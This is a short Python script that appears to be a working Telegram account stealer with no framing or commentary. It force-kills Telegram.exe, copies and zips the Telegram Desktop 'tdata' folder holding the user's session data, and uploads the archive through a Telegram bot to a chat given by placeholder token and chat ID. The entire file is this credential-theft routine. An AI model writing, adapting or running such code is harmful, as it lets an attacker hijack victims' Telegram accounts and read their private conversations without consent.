import os
import shutil
import telebot

bot = telebot.TeleBot("TOKENBOT")
chatid = "ID"

def zip_tdata():
    patharchive = os.path.join(f"C:\\Users\\{username}\\AppData\\Roaming\\Telegram Desktop", "tdata")
    zipfilee = os.path.join(os.getcwd(), "tdata.zip")
    
    if os.path.exists(patharchive):
        temp_dir = os.path.join(os.getcwd(), "temp_tdata")
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)
        os.makedirs(temp_dir, exist_ok=True)
        
        for item in os.listdir(patharchive):
            if item.lower() in ['emoji', 'dumps', 'media', 'cache']:
                continue
            item_path = os.path.join(patharchive, item)
            if os.path.isdir(item_path):
                shutil.copytree(item_path, os.path.join(temp_dir, item))
            else:
                shutil.copy2(item_path, temp_dir)
        shutil.make_archive(zipfilee.replace(".zip", ""), 'zip', temp_dir)
        shutil.rmtree(temp_dir)

        with open('tdata.zip', 'rb') as file:
            bot.send_document(chatid, file)

username = os.getlogin()

try:
    os.system(f"taskkill /f /im Telegram.exe")
except:
    pass

zip_tdata()
